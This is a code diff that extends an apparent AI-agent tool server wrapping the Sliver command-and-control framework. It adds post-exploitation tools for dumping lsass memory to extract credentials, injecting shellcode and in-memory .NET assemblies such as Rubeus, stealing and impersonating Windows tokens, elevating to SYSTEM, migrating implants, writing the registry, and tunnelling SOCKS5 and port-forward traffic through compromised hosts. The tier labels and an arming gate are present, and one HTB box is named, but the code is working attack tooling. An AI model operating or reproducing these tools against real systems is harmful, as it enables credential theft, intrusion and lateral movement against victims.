@@ -489,7 +489,30 @@ def build_server(manager: SliverManager):
                 # best-effort eviction; still compile fresh even if delete fails
                 evicted_stale = None
 
-        gen = await mgr.generate_implant(cfg, name=pool_name)
+        try:
+            gen = await mgr.generate_implant(cfg, name=pool_name)
+        except Exception as exc:
+            exc_str = str(exc)
+            if "rename import dir" in exc_str and "target exists" in exc_str:
+                # The Sliver team server has a stale build directory on disk that is
+                # not tracked in its DB (list_implant_builds returns nothing for this
+                # name, but the compile step fails because the directory already
+                # exists from a prior run). Surface an actionable remediation instead
+                # of the raw gRPC error so the operator knows what to do.
+                return err(
+                    f"stale build directory on the team server prevents compiling "
+                    f"'{pool_name}': the build is absent from the DB but its "
+                    f"directory still exists on disk. Remove it on the team server "
+                    f"then retry: "
+                    f"rm -rf ~/.sliver/slivers/{os_n}/{arch_n}/{pool_name} — "
+                    f"or call generate_beacon with a unique name to bypass the slot.",
+                    stale_build_dir=True,
+                    pool_name=pool_name,
+                    os=os_n,
+                    arch=arch_n,
+                    remedy=f"rm -rf ~/.sliver/slivers/{os_n}/{arch_n}/{pool_name}",
+                )
+            raise
         data = gen.File.Data
         fname = gen.File.Name or pool_name
         out_path = payload_dir() / fname
@@ -775,6 +798,383 @@ def build_server(manager: SliverManager):
         return ok("removed", path=res.Path, recursive=recursive)
 
     # ======================================================================
+    # Process inspection
+    # ======================================================================
+    @tool(tier="green")
+    async def ps(target_id: str) -> dict:
+        """List running processes on the implant host. green-tier."""
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.ps(), kind, target_id, "ps")
+        if pending is not None:
+            return pending
+        procs = [
+            {"pid": p.Pid, "executable": p.Executable,
+             "owner": p.Owner, "session_id": p.SessionID}
+            for p in res
+        ]
+        return ok(target_kind=kind, processes=procs, count=len(procs))
+
+    @tool(tier="green")
+    async def ifconfig(target_id: str) -> dict:
+        """List network interfaces on the implant host. green-tier."""
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.ifconfig(), kind, target_id, "ifconfig")
+        if pending is not None:
+            return pending
+        interfaces = [
+            {"index": iface.Index, "name": iface.Name,
+             "mac": iface.MAC, "ips": list(iface.IPAddresses)}
+            for iface in res.NetInterfaces
+        ]
+        return ok(target_kind=kind, interfaces=interfaces)
+
+    @tool(tier="green")
+    async def netstat(
+        target_id: str,
+        tcp: bool = True,
+        udp: bool = False,
+        ipv4: bool = True,
+        ipv6: bool = False,
+        listening: bool = True,
+    ) -> dict:
+        """List network connections on the implant host. green-tier."""
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.netstat(
+                tcp=tcp, udp=udp, ipv4=ipv4, ipv6=ipv6, listening=listening),
+            kind, target_id, "netstat")
+        if pending is not None:
+            return pending
+        entries = []
+        for e in res.Entries:
+            proc = getattr(e, "Process", None)
+            entries.append({
+                "local": f"{e.LocalAddr.Ip}:{e.LocalAddr.Port}",
+                "remote": f"{e.RemoteAddr.Ip}:{e.RemoteAddr.Port}",
+                "state": e.SkState,
+                "process": {"pid": proc.Pid, "exe": proc.Executable}
+                           if proc and proc.Pid else None,
+            })
+        return ok(target_kind=kind, entries=entries, count=len(entries))
+
+    @tool(tier="green")
+    async def screenshot(target_id: str, save_path: str | None = None) -> dict:
+        """Capture a desktop screenshot from the implant host. Saved as PNG. green-tier."""
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.screenshot(), kind, target_id, "screenshot")
+        if pending is not None:
+            return pending
+        data = res.Data
+        dest = Path(save_path) if save_path else payload_dir() / "screenshot.png"
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        dest.write_bytes(data)
+        return ok("screenshot captured", target_kind=kind,
+                  saved_path=str(dest), size_bytes=len(data))
+
+    @tool(tier="yellow")
+    async def process_dump(target_id: str, pid: int, save_path: str | None = None) -> dict:
+        """Dump a remote process memory by PID. yellow-tier.
+
+        Common use: lsass PID for credential extraction. Find lsass PID with ps().
+        """
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.process_dump(pid), kind, target_id,
+            f"process_dump pid={pid}")
+        if pending is not None:
+            return pending
+        data = res.Data
+        dest = Path(save_path) if save_path else payload_dir() / f"procdump_{pid}.bin"
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        dest.write_bytes(data)
+        return ok("process dumped", target_kind=kind, pid=pid,
+                  saved_path=str(dest), size_bytes=len(data))
+
+    # ======================================================================
+    # In-memory execution
+    # ======================================================================
+    @tool(tier="yellow")
+    async def execute_assembly(
+        target_id: str,
+        assembly_path: str,
+        arguments: str = "",
+        process: str = "notepad.exe",
+        is_dll: bool = False,
+        arch: str = "x86_64",
+        class_name: str = "",
+        method: str = "",
+        app_domain: str = "",
+    ) -> dict:
+        """Execute a .NET assembly in-memory on the implant host. yellow-tier.
+
+        ``assembly_path`` is the local path to the .NET assembly (.exe/.dll).
+        Common assemblies: SharpHound.exe, Rubeus.exe, Seatbelt.exe, SharpUp.exe,
+        Certify.exe (from the Sliver armory or the payload dir).
+        Nothing lands on disk — the assembly is CLR-injected into ``process``.
+        """
+        asm_file = Path(assembly_path)
+        if not asm_file.exists():
+            asm_file = payload_dir() / assembly_path
+        if not asm_file.exists():
+            return err(f"assembly not found: {assembly_path} (also checked payload dir)")
+        asm_bytes = asm_file.read_bytes()
+
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.execute_assembly(
+                asm_bytes, arguments, process, is_dll, arch,
+                class_name, method, app_domain),
+            kind, target_id, f"execute_assembly {asm_file.name}")
+        if pending is not None:
+            return pending
+        return ok(target_kind=kind, assembly=asm_file.name,
+                  arguments=arguments, output=res.Output)
+
+    @tool(tier="yellow")
+    async def execute_shellcode(
+        target_id: str,
+        shellcode_b64: str,
+        pid: int = 0,
+        rwx: bool = False,
+        encoder: str = "",
+    ) -> dict:
+        """Inject shellcode into a remote process by PID. yellow-tier.
+
+        ``shellcode_b64`` is the raw shellcode base64-encoded.
+        ``pid`` 0 means spawn a sacrificial process for injection.
+        """
+        try:
+            shellcode = base64.b64decode(shellcode_b64)
+        except Exception:
+            return err("shellcode_b64 is not valid base64")
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.execute_shellcode(shellcode, rwx, pid, encoder),
+            kind, target_id, "execute_shellcode")
+        if pending is not None:
+            return pending
+        return ok("shellcode injected", target_kind=kind, pid=pid,
+                  size_bytes=len(shellcode))
+
+    # ======================================================================
+    # Token ops (Windows only)
+    # ======================================================================
+    @tool(tier="yellow")
+    async def make_token(
+        target_id: str, username: str, password: str, domain: str = ""
+    ) -> dict:
+        """Create a Windows user token from credentials. yellow-tier.
+
+        Does not require the user to be logged on locally; creates a network-type
+        token for lateral movement. Verify with execute_command(whoami /all).
+        """
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.make_token(username, password, domain),
+            kind, target_id, f"make_token {domain}\\{username}")
+        if pending is not None:
+            return pending
+        return ok("token created", target_kind=kind,
+                  username=username, domain=domain)
+
+    @tool(tier="yellow")
+    async def impersonate(target_id: str, username: str) -> dict:
+        """Steal a running user's token by username. yellow-tier (Windows only).
+
+        The user must have an active process on the host. Use ps() to enumerate.
+        Call revert_to_self() when the impersonation context is no longer needed.
+        """
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.impersonate(username),
+            kind, target_id, f"impersonate {username}")
+        if pending is not None:
+            return pending
+        return ok(f"impersonating {username}", target_kind=kind,
+                  username=username, output=res.Output)
+
+    @tool(tier="yellow")
+    async def revert_to_self(target_id: str) -> dict:
+        """Drop impersonation and return to the original implant token. yellow-tier."""
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.revert_to_self(),
+            kind, target_id, "revert_to_self")
+        if pending is not None:
+            return pending
+        return ok("reverted to self", target_kind=kind)
+
+    @tool(tier="yellow")
+    async def run_as(
+        target_id: str, username: str, process_name: str, args: str = ""
+    ) -> dict:
+        """Run a command as another user on the implant host. yellow-tier (Windows only).
+
+        Call make_token() first to create the user context, then run_as().
+        """
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.run_as(username, process_name, args),
+            kind, target_id, f"run_as {username}")
+        if pending is not None:
+            return pending
+        return ok(target_kind=kind, username=username,
+                  process_name=process_name, output=res.Output)
+
+    @tool(tier="red", armed=True)
+    async def get_system(
+        target_id: str,
+        c2_host: str,
+        hosting_process: str = "spoolsv.exe",
+        c2_port: int = 443,
+        protocol: str = "https",
+        target_os: str = "windows",
+        target_arch: str = "amd64",
+    ) -> dict:
+        """Attempt SYSTEM elevation by injecting an implant into a SYSTEM process.
+        RED-tier — requires arm_dangerous() first. Windows only.
+
+        ``c2_host`` must be the current session's C2 host (from session_info active_c2).
+        The new SYSTEM implant uses the same C2 profile as the current session.
+        """
+        cfg, _ = build_implant_config(
+            is_beacon=False, os=target_os, arch=target_arch,
+            protocol=protocol, c2_host=c2_host, c2_port=c2_port,
+        )
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.get_system(hosting_process, cfg),
+            kind, target_id, "get_system")
+        if pending is not None:
+            return pending
+        return ok("get_system completed", target_kind=kind,
+                  hosting_process=hosting_process)
+
+    # ======================================================================
+    # Process migration
+    # ======================================================================
+    @tool(tier="yellow")
+    async def migrate(
+        target_id: str,
+        pid: int,
+        c2_host: str,
+        c2_port: int = 443,
+        protocol: str = "https",
+        target_os: str = "windows",
+        target_arch: str = "amd64",
+    ) -> dict:
+        """Migrate the implant into another process by PID. yellow-tier.
+
+        Injects a new session into the target PID. Use ps() to identify a stable,
+        long-running process. ``c2_host`` must match the current session's C2 host.
+        """
+        cfg, _ = build_implant_config(
+            is_beacon=False, os=target_os, arch=target_arch,
+            protocol=protocol, c2_host=c2_host, c2_port=c2_port,
+        )
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.migrate(pid, cfg),
+            kind, target_id, f"migrate pid={pid}")
+        if pending is not None:
+            return pending
+        return ok("migration initiated", target_kind=kind,
+                  pid=pid, success=res.Success)
+
+    # ======================================================================
+    # Registry (Windows only)
+    # ======================================================================
+    @tool(tier="green")
+    async def registry_read(
+        target_id: str,
+        hive: str,
+        path: str,
+        key: str,
+        hostname: str = "",
+    ) -> dict:
+        """Read a registry key value from the implant host. green-tier (Windows only).
+
+        Common hives: HKCU, HKLM, HKCC, HKU, HKCR.
+        Example: hive=HKLM path=SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion key=ProductName
+        """
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.registry_read(hive, path, key, hostname),
+            kind, target_id, f"registry_read {hive}\\{path}\\{key}")
+        if pending is not None:
+            return pending
+        return ok(target_kind=kind, hive=hive, path=path, key=key, value=res.Value)
+
+    @tool(tier="yellow")
+    async def registry_write(
+        target_id: str,
+        hive: str,
+        path: str,
+        key: str,
+        value: str,
+        value_type: str = "String",
+        hostname: str = "",
+    ) -> dict:
+        """Write a registry key value on the implant host. yellow-tier (Windows only).
+
+        ``value_type``: String (default), DWORD, QWORD, Binary.
+        ``value`` is always a string; numeric types are auto-converted.
+        """
+        # RegistryType enum values: Unknown=0, Binary=1, String=2, DWORD=3, QWORD=4
+        type_map = {"string": 2, "dword": 3, "qword": 4, "binary": 1}
+        reg_type = type_map.get(value_type.lower())
+        if reg_type is None:
+            return err(f"unknown value_type '{value_type}'; use String, DWORD, QWORD, or Binary")
+
+        string_val = value if value_type.lower() == "string" else ""
+        dword_val = int(value) if value_type.lower() == "dword" else 0
+        qword_val = int(value) if value_type.lower() == "qword" else 0
+
+        interactive, kind = await mgr.interact(target_id)
+        if interactive is None:
+            return err(f"no session or beacon with id {target_id}")
+        res, pending = await _resolve_exec(
+            await interactive.registry_write(
+                hive, path, key, hostname,
+                string_val, b"", dword_val, qword_val, reg_type),
+            kind, target_id, f"registry_write {hive}\\{path}\\{key}")
+        if pending is not None:
+            return pending
+        return ok("registry key written", target_kind=kind,
+                  hive=hive, path=path, key=key, value=value, value_type=value_type)
+
+    # ======================================================================
     # Pivots (listing only — see README on the sliver-py tunnel limitation)
     # ======================================================================
     @tool(tier="passive")
@@ -789,6 +1189,95 @@ def build_server(manager: SliverManager):
                   count=len(pivots))
 
     # ======================================================================
+    # Tunnels — SOCKS5 proxy and static port-forward via gRPC streaming
+    # ======================================================================
+    @tool(tier="green")
+    async def list_tunnels() -> dict:
+        """List active SOCKS5 proxies and port-forwards started by this MCP."""
+        info = mgr.list_tunnels()
+        return ok(
+            socks_proxies=info["socks"],
+            portfwds=info["portfwd"],
+            socks_count=len(info["socks"]),
+            portfwd_count=len(info["portfwd"]),
+        )
+
+    @tool(tier="yellow")
+    async def start_socks(session_id: str, local_port: int = 1080) -> dict:
+        """Start a SOCKS5 proxy on local_port routed through a Sliver session.
+
+        Once started, point proxychains / curl --socks5 / Impacket at
+        127.0.0.1:<local_port>.  The Sliver server handles SOCKS5 negotiation;
+        the client just pipes raw bytes.
+        session_id: active session ID (not beacon — sessions only)
+        local_port: TCP port to bind on localhost (default 1080)
+        """
+        if local_port < 1 or local_port > 65535:
+            return err("local_port must be 1–65535")
+        try:
+            port = await mgr.start_socks(session_id, local_port)
+        except ValueError as exc:
+            return err(str(exc))
+        _PROXYCHAINS_CONF = Path.home() / ".cache" / "dagar-proxychains.conf"
+        _PROXYCHAINS_CONF.parent.mkdir(exist_ok=True)
+        _PROXYCHAINS_CONF.write_text(
+            "strict_chain\nproxy_dns\n\n[ProxyList]\n"
+            f"socks5  127.0.0.1  {port}\n"
+        )
+        if mgr.store is not None:
+            try:
+                mgr.store.add_route(session_id, "0.0.0.0/0",
+                                    f"socks5://127.0.0.1:{port}")
+            except Exception:
+                pass
+        return ok(f"SOCKS5 proxy started on 127.0.0.1:{port}",
+                  session_id=session_id, local_port=port,
+                  proxychains=f"socks5 127.0.0.1 {port}",
+                  proxychains_conf=str(_PROXYCHAINS_CONF))
+
+    @tool(tier="yellow")
+    async def stop_socks(local_port: int) -> dict:
+        """Stop an active SOCKS5 proxy on local_port."""
+        stopped = await mgr.stop_socks(local_port)
+        if not stopped:
+            return err(f"no SOCKS5 proxy found on port {local_port}")
+        (Path.home() / ".cache" / "dagar-proxychains.conf").unlink(missing_ok=True)
+        return ok(f"SOCKS5 proxy on port {local_port} stopped", local_port=local_port)
+
+    @tool(tier="yellow")
+    async def start_portfwd(session_id: str, local_port: int,
+                             remote_host: str, remote_port: int) -> dict:
+        """Forward local_port → remote_host:remote_port via a Sliver session.
+
+        The implant makes the TCP connection to remote_host:remote_port; data
+        flows through the TunnelData gRPC stream back to local_port.
+        session_id: active session ID (not beacon)
+        local_port: TCP port to bind on localhost
+        remote_host: target host the implant should connect to
+        remote_port: target port
+        """
+        if local_port < 1 or local_port > 65535:
+            return err("local_port must be 1–65535")
+        if remote_port < 1 or remote_port > 65535:
+            return err("remote_port must be 1–65535")
+        try:
+            port = await mgr.start_portfwd(session_id, local_port,
+                                            remote_host, remote_port)
+        except ValueError as exc:
+            return err(str(exc))
+        return ok(f"portfwd started: 127.0.0.1:{port} → {remote_host}:{remote_port}",
+                  session_id=session_id, local_port=port,
+                  remote_host=remote_host, remote_port=remote_port)
+
+    @tool(tier="yellow")
+    async def stop_portfwd(local_port: int) -> dict:
+        """Stop an active port-forward on local_port."""
+        stopped = await mgr.stop_portfwd(local_port)
+        if not stopped:
+            return err(f"no portfwd found on port {local_port}")
+        return ok(f"portfwd on port {local_port} stopped", local_port=local_port)
+
+    # ======================================================================
     # Handoff
     # ======================================================================
     @tool(tier="passive")
@@ -801,6 +1290,32 @@ def build_server(manager: SliverManager):
         return await handoff.build_export(mgr.client, mgr.safety.snapshot(),
                                           mgr.operator)
 
+    @tool(tier="green", requires_client=False)
+    async def open_store(engagement: str) -> dict:
+        """Open (or create) a dagar-state SQLite store for this engagement.
+
+        engagement: human name / box slug (e.g. "htb-conversor"). Future
+        ingest_handoff calls and incoming session events will populate it.
+        """
+        try:
+            db_path = mgr.open_store(engagement)
+        except RuntimeError as exc:
+            return err(str(exc))
+        return ok(f"engagement store opened for '{engagement}'", db_path=db_path)
+
+    @tool(tier="passive", requires_client=False)
+    async def export_state() -> dict:
+        """Export the current dagar-state engagement store as structured JSON.
+
+        Returns hosts, services, creds, sessions, privileges, and routes.
+        Requires open_store to have been called first.
+        """
+        if mgr.store is None:
+            return err("no engagement store open — call open_store first")
+        data = mgr.store.export_json()
+        counts = {k: len(v) for k, v in data.items()}
+        return ok("engagement state exported", counts=counts, **data)
+
     @tool(tier="green")
     async def ingest_handoff(handoff_data: dict) -> dict:
         """Stand up a listener + beacon from a p0rtix/msf-style handoff.
@@ -808,7 +1323,15 @@ def build_server(manager: SliverManager):
         Accepts loose keys (redirector/callback_domain/domain/lhost/host/hosts,
         protocol, port, os, arch) and creates a matching listener, then generates
         a matching beacon. Honors the current noise ceiling.
+
+        If a dagar-state store is open (via open_store), seeds it with any
+        host/service/credential facts present in the handoff.
         """
+        if mgr.store is not None:
+            try:
+                mgr.store.import_from_portix_facts(handoff_data)
+            except Exception:
+                pass
         plan = handoff.normalize_ingest(handoff_data)
         proto = plan["protocol"]
 
